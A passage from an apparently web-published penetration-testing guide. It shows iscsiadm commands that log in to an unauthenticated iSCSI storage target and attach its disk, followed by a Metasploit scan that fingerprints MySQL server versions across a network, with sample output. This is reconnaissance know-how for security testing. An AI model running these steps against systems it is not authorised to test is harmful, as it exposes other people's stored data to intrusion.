<span class="n">Login</span> <span class="n">to</span> <span class="p">[</span><span class="n">iface</span><span class="p">:</span> <span class="n">default</span><span class="p">,</span> <span class="n">target</span><span class="p">:</span> <span class="n">iqn</span><span class="o">.</span><span class="mi">1992</span><span class="o">-</span><span class="mf">05.</span><span class="n">com</span><span class="o">.</span><span class="n">emc</span><span class="p">:</span><span class="n">fl1001433000190000</span><span class="o">-</span><span class="mi">3</span><span class="o">-</span><span class="n">vnxe</span><span class="p">,</span> <span class="n">portal</span><span class="p">:</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">,</span><span class="mi">3260</span><span class="p">]</span> <span class="n">successful</span><span class="o">.</span>
</pre></div>
</div>
<p>Failed Result: When we login, ideally we should be able to see the location, however for some strange reason we didn&#8217;t got that here.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="mf">43852.014179</span><span class="p">]</span> <span class="n">scsi</span> <span class="n">host6</span><span class="p">:</span> <span class="n">iSCSI</span> <span class="n">Initiator</span> <span class="n">over</span> <span class="n">TCP</span><span class="o">/</span><span class="n">IP</span>
<span class="p">[</span><span class="mf">43852.306055</span><span class="p">]</span> <span class="n">scsi</span> <span class="mi">6</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span> <span class="n">Direct</span><span class="o">-</span><span class="n">Access</span>     <span class="n">EMC</span>      <span class="n">Celerra</span>          <span class="mi">0002</span> <span class="n">PQ</span><span class="p">:</span> <span class="mi">1</span> <span class="n">ANSI</span><span class="p">:</span> <span class="mi">5</span>
<span class="p">[</span><span class="mf">43852.323940</span><span class="p">]</span> <span class="n">scsi</span> <span class="mi">6</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span> <span class="n">Attached</span> <span class="n">scsi</span> <span class="n">generic</span> <span class="n">sg1</span> <span class="nb">type</span> <span class="mi">0</span>
</pre></div>
</div>
<p>Sucessful Result: If we see, the drive is attached to sdb1</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="mf">125933.964768</span><span class="p">]</span> <span class="n">scsi</span> <span class="n">host10</span><span class="p">:</span> <span class="n">iSCSI</span> <span class="n">Initiator</span> <span class="n">over</span> <span class="n">TCP</span><span class="o">/</span><span class="n">IP</span>
<span class="p">[</span><span class="mf">125934.259637</span><span class="p">]</span> <span class="n">scsi</span> <span class="mi">10</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span> <span class="n">Direct</span><span class="o">-</span><span class="n">Access</span>     <span class="n">LIO</span><span class="o">-</span><span class="n">ORG</span>  <span class="n">FILEIO</span>           <span class="n">v2</span><span class="o">.</span>  <span class="n">PQ</span><span class="p">:</span> <span class="mi">0</span> <span class="n">ANSI</span><span class="p">:</span> <span class="mi">2</span>
<span class="p">[</span><span class="mf">125934.259919</span><span class="p">]</span> <span class="n">sd</span> <span class="mi">10</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span> <span class="n">Attached</span> <span class="n">scsi</span> <span class="n">generic</span> <span class="n">sg1</span> <span class="nb">type</span> <span class="mi">0</span>
<span class="p">[</span><span class="mf">125934.266155</span><span class="p">]</span> <span class="n">sd</span> <span class="mi">10</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span> <span class="p">[</span><span class="n">sdb</span><span class="p">]</span> <span class="mi">2097152001</span> <span class="mi">512</span><span class="o">-</span><span class="n">byte</span> <span class="n">logical</span> <span class="n">blocks</span><span class="p">:</span> <span class="p">(</span><span class="mf">1.07</span> <span class="n">TB</span><span class="o">/</span><span class="mi">1000</span> <span class="n">GiB</span><span class="p">)</span>
<span class="p">[</span><span class="mf">125934.266794</span><span class="p">]</span> <span class="n">sd</span> <span class="mi">10</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span> <span class="p">[</span><span class="n">sdb</span><span class="p">]</span> <span class="n">Write</span> <span class="n">Protect</span> <span class="ow">is</span> <span class="n">off</span>
<span class="p">[</span><span class="mf">125934.266801</span><span class="p">]</span> <span class="n">sd</span> <span class="mi">10</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span> <span class="p">[</span><span class="n">sdb</span><span class="p">]</span> <span class="n">Mode</span> <span class="n">Sense</span><span class="p">:</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
<span class="p">[</span><span class="mf">125934.268003</span><span class="p">]</span> <span class="n">sd</span> <span class="mi">10</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span> <span class="p">[</span><span class="n">sdb</span><span class="p">]</span> <span class="n">Write</span> <span class="n">cache</span><span class="p">:</span> <span class="n">disabled</span><span class="p">,</span> <span class="n">read</span> <span class="n">cache</span><span class="p">:</span> <span class="n">enabled</span><span class="p">,</span> <span class="n">doesn</span><span class="s1">&#39;t support DPO or FUA</span>
<span class="p">[</span><span class="mf">125934.275206</span><span class="p">]</span>  <span class="n">sdb</span><span class="p">:</span> <span class="n">sdb1</span>
<span class="p">[</span><span class="mf">125934.279017</span><span class="p">]</span> <span class="n">sd</span> <span class="mi">10</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span> <span class="p">[</span><span class="n">sdb</span><span class="p">]</span> <span class="n">Attached</span> <span class="n">SCSI</span> <span class="n">dis</span>
</pre></div>
</div>
<p>We can logout using &#8211;logout</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">iscsiadm</span> <span class="o">-</span><span class="n">m</span> <span class="n">node</span> <span class="o">--</span><span class="n">targetname</span><span class="o">=</span><span class="s2">&quot;iqn.1992-05.com.emc:fl1001433000190000-3-vnxe&quot;</span> <span class="o">-</span><span class="n">p</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">--</span><span class="n">logout</span>
<span class="n">Logging</span> <span class="n">out</span> <span class="n">of</span> <span class="n">session</span> <span class="p">[</span><span class="n">sid</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">target</span><span class="p">:</span> <span class="n">iqn</span><span class="o">.</span><span class="mi">1992</span><span class="o">-</span><span class="mf">05.</span><span class="n">com</span><span class="o">.</span><span class="n">emc</span><span class="p">:</span><span class="n">fl1001433000190000</span><span class="o">-</span><span class="mi">3</span><span class="o">-</span><span class="n">vnxe</span><span class="p">,</span> <span class="n">portal</span><span class="p">:</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">,</span><span class="mi">3260</span><span class="p">]</span>
<span class="n">Logout</span> <span class="n">of</span> <span class="p">[</span><span class="n">sid</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">target</span><span class="p">:</span> <span class="n">iqn</span><span class="o">.</span><span class="mi">1992</span><span class="o">-</span><span class="mf">05.</span><span class="n">com</span><span class="o">.</span><span class="n">emc</span><span class="p">:</span><span class="n">fl1001433000190000</span><span class="o">-</span><span class="mi">3</span><span class="o">-</span><span class="n">vnxe</span><span class="p">,</span> <span class="n">portal</span><span class="p">:</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">,</span><span class="mi">3260</span><span class="p">]</span> <span class="n">successful</span><span class="o">.</span>
</pre></div>
</div>
<p>We can find more information about it by just using without any &#8211;login/&#8211;logout parameter</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">iscsiadm</span> <span class="o">-</span><span class="n">m</span> <span class="n">node</span> <span class="o">--</span><span class="n">targetname</span><span class="o">=</span><span class="s2">&quot;iqn.1992-05.com.emc:fl1001433000190000-3-vnxe&quot;</span> <span class="o">-</span><span class="n">p</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="c1"># BEGIN RECORD 2.0-873</span>
<span class="n">node</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">iqn</span><span class="o">.</span><span class="mi">1992</span><span class="o">-</span><span class="mf">05.</span><span class="n">com</span><span class="o">.</span><span class="n">emc</span><span class="p">:</span><span class="n">fl1001433000190000</span><span class="o">-</span><span class="mi">3</span><span class="o">-</span><span class="n">vnxe</span>
<span class="n">node</span><span class="o">.</span><span class="n">tpgt</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">node</span><span class="o">.</span><span class="n">startup</span> <span class="o">=</span> <span class="n">manual</span>
<span class="n">node</span><span class="o">.</span><span class="n">leading_login</span> <span class="o">=</span> <span class="n">No</span>
<span class="n">iface</span><span class="o">.</span><span class="n">hwaddress</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">iface</span><span class="o">.</span><span class="n">ipaddress</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">iface</span><span class="o">.</span><span class="n">iscsi_ifacename</span> <span class="o">=</span> <span class="n">default</span>
<span class="n">iface</span><span class="o">.</span><span class="n">net_ifacename</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">iface</span><span class="o">.</span><span class="n">transport_name</span> <span class="o">=</span> <span class="n">tcp</span>
<span class="n">iface</span><span class="o">.</span><span class="n">initiatorname</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">iface</span><span class="o">.</span><span class="n">bootproto</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">iface</span><span class="o">.</span><span class="n">subnet_mask</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">iface</span><span class="o">.</span><span class="n">gateway</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">iface</span><span class="o">.</span><span class="n">ipv6_autocfg</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">iface</span><span class="o">.</span><span class="n">linklocal_autocfg</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">iface</span><span class="o">.</span><span class="n">router_autocfg</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">iface</span><span class="o">.</span><span class="n">ipv6_linklocal</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">iface</span><span class="o">.</span><span class="n">ipv6_router</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">iface</span><span class="o">.</span><span class="n">state</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">iface</span><span class="o">.</span><span class="n">vlan_id</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">iface</span><span class="o">.</span><span class="n">vlan_priority</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">iface</span><span class="o">.</span><span class="n">vlan_state</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">iface</span><span class="o">.</span><span class="n">iface_num</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">iface</span><span class="o">.</span><span class="n">mtu</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">iface</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">node</span><span class="o">.</span><span class="n">discovery_address</span> <span class="o">=</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">node</span><span class="o">.</span><span class="n">discovery_port</span> <span class="o">=</span> <span class="mi">3260</span>
<span class="n">node</span><span class="o">.</span><span class="n">discovery_type</span> <span class="o">=</span> <span class="n">send_targets</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">initial_cmdsn</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">initial_login_retry_max</span> <span class="o">=</span> <span class="mi">8</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">xmit_thread_priority</span> <span class="o">=</span> <span class="o">-</span><span class="mi">20</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">cmds_max</span> <span class="o">=</span> <span class="mi">128</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">queue_depth</span> <span class="o">=</span> <span class="mi">32</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">nr_sessions</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">auth</span><span class="o">.</span><span class="n">authmethod</span> <span class="o">=</span> <span class="kc">None</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">auth</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">auth</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">auth</span><span class="o">.</span><span class="n">username_in</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">auth</span><span class="o">.</span><span class="n">password_in</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">timeo</span><span class="o">.</span><span class="n">replacement_timeout</span> <span class="o">=</span> <span class="mi">120</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">err_timeo</span><span class="o">.</span><span class="n">abort_timeout</span> <span class="o">=</span> <span class="mi">15</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">err_timeo</span><span class="o">.</span><span class="n">lu_reset_timeout</span> <span class="o">=</span> <span class="mi">30</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">err_timeo</span><span class="o">.</span><span class="n">tgt_reset_timeout</span> <span class="o">=</span> <span class="mi">30</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">err_timeo</span><span class="o">.</span><span class="n">host_reset_timeout</span> <span class="o">=</span> <span class="mi">60</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">FastAbort</span> <span class="o">=</span> <span class="n">Yes</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">InitialR2T</span> <span class="o">=</span> <span class="n">No</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">ImmediateData</span> <span class="o">=</span> <span class="n">Yes</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">FirstBurstLength</span> <span class="o">=</span> <span class="mi">262144</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">MaxBurstLength</span> <span class="o">=</span> <span class="mi">16776192</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">DefaultTime2Retain</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">DefaultTime2Wait</span> <span class="o">=</span> <span class="mi">2</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">MaxConnections</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">MaxOutstandingR2T</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">node</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">ERL</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="mi">3260</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">startup</span> <span class="o">=</span> <span class="n">manual</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">tcp</span><span class="o">.</span><span class="n">window_size</span> <span class="o">=</span> <span class="mi">524288</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">tcp</span><span class="o">.</span><span class="n">type_of_service</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">timeo</span><span class="o">.</span><span class="n">logout_timeout</span> <span class="o">=</span> <span class="mi">15</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">timeo</span><span class="o">.</span><span class="n">login_timeout</span> <span class="o">=</span> <span class="mi">15</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">timeo</span><span class="o">.</span><span class="n">auth_timeout</span> <span class="o">=</span> <span class="mi">45</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">timeo</span><span class="o">.</span><span class="n">noop_out_interval</span> <span class="o">=</span> <span class="mi">5</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">timeo</span><span class="o">.</span><span class="n">noop_out_timeout</span> <span class="o">=</span> <span class="mi">5</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">MaxXmitDataSegmentLength</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">MaxRecvDataSegmentLength</span> <span class="o">=</span> <span class="mi">262144</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">HeaderDigest</span> <span class="o">=</span> <span class="kc">None</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">DataDigest</span> <span class="o">=</span> <span class="kc">None</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">IFMarker</span> <span class="o">=</span> <span class="n">No</span>
<span class="n">node</span><span class="o">.</span><span class="n">conn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">iscsi</span><span class="o">.</span><span class="n">OFMarker</span> <span class="o">=</span> <span class="n">No</span>
<span class="c1"># END RECORD</span>
</pre></div>
</div>
<p>We have created a script to automate login/ logout process available at <a class="reference external" href="https://github.com/bitvijays/Pentest-Scripts/tree/master/Vulnerability_Analysis/isciadm">iscsiadm</a></p>
</div>
</div>
</div>
<div class="section" id="mysql-port-3306">
<h2>MySQL | Port 3306<a class="headerlink" href="#mysql-port-3306" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id50">
<h3>Metasploit<a class="headerlink" href="#id50" title="Permalink to this headline">¶</a></h3>
<div class="section" id="mysql-server-version-enumeration">
<h4>MySQL Server Version Enumeration<a class="headerlink" href="#mysql-server-version-enumeration" title="Permalink to this headline">¶</a></h4>
<p>Enumerates the version of MySQL servers</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">mysql_version</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">3306</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.7</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span><span class="p">,</span> <span class="n">but</span> <span class="n">responds</span> <span class="k">with</span> <span class="n">an</span> <span class="n">error</span><span class="p">:</span> \<span class="n">x04Host</span> <span class="s1">&#39;10.10.3.71&#39;</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">allowed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">this</span> <span class="n">MySQL</span> <span class="n">server</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span> <span class="mf">5.5</span><span class="o">.</span><span class="mi">47</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mf">14.04</span><span class="o">.</span><span class="mi">1</span><span class="o">-</span><span class="n">log</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">10</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span> <span class="mf">5.5</span><span class="o">.</span><span class="mi">47</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mf">14.04</span><span class="o">.</span><span class="mi">1</span><span class="o">-</span><span class="n">log</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">10</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span>  <span class="mi">5</span> <span class="n">of</span> <span class="mi">44</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">11</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span> <span class="mf">5.1</span><span class="o">.</span><span class="mi">52</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">10</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span> <span class="mf">5.1</span><span class="o">.</span><span class="mi">52</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">10</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span> <span class="mf">5.5</span><span class="o">.</span><span class="mi">35</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mf">12.04</span><span class="o">.</span><span class="mi">2</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">10</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span> <span class="mf">5.0</span><span class="o">.</span><span class="mi">95</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">10</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span>  <span class="mi">9</span> <span class="n">of</span> <span class="mi">44</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">20</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span> <span class="mf">5.0</span><span class="o">.</span><span class="mi">22</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">10</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span><span class="p">,</span> <span class="n">but</span> <span class="n">responds</span> <span class="k">with</span> <span class="n">an</span> <span class="n">error</span><span class="p">:</span> \<span class="n">x04Host</span> <span class="s1">&#39;10.10.3.71&#39;</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">allowed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">this</span> <span class="n">MySQL</span> <span class="n">server</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span><span class="p">,</span> <span class="n">but</span> <span class="n">responds</span> <span class="k">with</span> <span class="n">an</span> <span class="n">error</span><span class="p">:</span> \<span class="n">x04Host</span> <span class="s1">&#39;10.10.3.71&#39;</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">allowed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">this</span> <span class="n">MariaDB</span> <span class="n">server</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span> <span class="mf">5.0</span><span class="o">.</span><span class="mi">22</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">10</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3306</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">MySQL</span><span class="p">,</span> <span class="n">but</span> <span class="n">responds</span> <span class="k">with</span> <span class="n">an</span> <span class="n">error</span><span class="p">:</span> \<span class="n">x04Host</span> <span class="s1">&#39;10.10.3.71&#39;</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">allowed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">this</span> <span class="n">MySQL</span> <span class="n">server</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">14</span> <span class="n">of</span> <span class="mi">44</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">31</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
